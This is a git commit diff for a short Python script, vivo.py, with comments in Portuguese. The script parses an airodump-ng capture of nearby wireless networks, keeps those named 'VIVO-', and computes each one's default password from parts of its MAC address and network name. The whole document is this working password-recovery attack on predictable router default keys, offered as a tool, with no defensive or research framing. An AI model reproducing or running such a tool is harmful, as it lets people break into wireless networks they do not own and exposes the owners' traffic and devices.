d5fadc07a2e5de8e232bcc05ec7041f481c2401d
NatanMalta <natanmb13@gmail.com>
2018-09-19 17:20:08 -0300

    Script

--- vivo.py
+++ vivo.py
@@ -1,6 +1,7 @@
 import csv
 
-arquivoCsv = open('vivo-01.csv', 'r')
+arquivoCsv = open(str(input('Arquivo .csv Airodump-ng: ')), 'r')
+print('\n    Rede     Senha')
 
 try:
     reader = csv.reader(arquivoCsv)
@@ -11,17 +12,19 @@ try:
             pass
         else:
 
-            if linha[0] == 'Station MAC':
+            if linha[0] == 'Station MAC': # Sai do for porque é onde acaba as redes wireless do arquivo .csv
                 break
             else:
-                dicio = { 'BSSID':linha[0],'ESSID':linha[13] }
+                dicio = { 'BSSID':linha[0],'ESSID':linha[13] } # Dicionário que contem o nome e MAC da rede wirilless
 
-                if dicio['BSSID'] == 'BSSID':
+                if dicio['BSSID'] == 'BSSID': # Ignora a primeira linha do arquivo .csv
                     pass
                 else:
+                    if 'VIVO-' in dicio['ESSID']: # Apenas mostra as redes VIVO-
+                        senha = dicio['BSSID'][3:-5].replace(':', '')+dicio['ESSID'][6:]
 
-                    if 'VIVO-' in dicio['ESSID']:
-                        print(dicio['ESSID'], dicio['BSSID'][3:].replace(':',''))
+                        print(dicio['ESSID'], senha)
 
 finally:
+    print('\n')
     arquivoCsv.close()
